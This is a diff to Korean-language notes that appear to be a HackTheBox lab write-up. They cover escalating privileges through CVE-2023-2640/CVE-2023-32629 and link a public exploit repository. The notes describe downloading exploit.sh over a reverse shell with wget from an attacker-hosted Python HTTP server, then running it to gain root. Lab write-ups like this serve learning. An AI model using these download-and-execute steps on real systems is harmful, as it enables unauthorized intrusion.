@@ -26,7 +26,7 @@
   - 마운트된 파일에 권한 있는 확장 속성 설정을 가능하게 하는 취약점
   - 저번 htb에서 비슷하고 본것 같은 권한상승 방법
 - https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post_page-----887fd3d6fee9
-- 해당 웹쉘을 리버스 쉘로 연결된 상태에서 wget <ip>:8001/exploit.sh로 다운로드 시킨다.
+- 해당 웹쉘을 리버스 쉘로 연결된 상태에서 wget \<ip\>:8001/exploit.sh로 다운로드 시킨다.
 - kali에서는 /var/www/html에 exploit.sh를 위치 시키고 python3 -m http.server 8001을 실행한다.
   - 실행하여 권한을 상승한다.
 <br></br>
